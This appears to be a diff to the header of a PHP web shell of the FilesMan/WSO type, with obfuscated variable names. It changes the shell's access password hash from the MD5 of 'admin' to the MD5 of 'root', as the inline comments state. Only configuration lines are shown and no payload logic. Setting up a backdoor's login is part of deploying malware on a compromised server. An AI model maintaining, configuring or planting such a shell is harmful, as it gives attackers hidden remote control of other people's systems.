@@ -1,6 +1,6 @@
 ﻿<?php
 
-$▛ = "21232f297a57a5a743894a0e4a801fc3"; //admin
+$▛ = "63a9f0ea7bb98050796b649e85481845"; //root
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
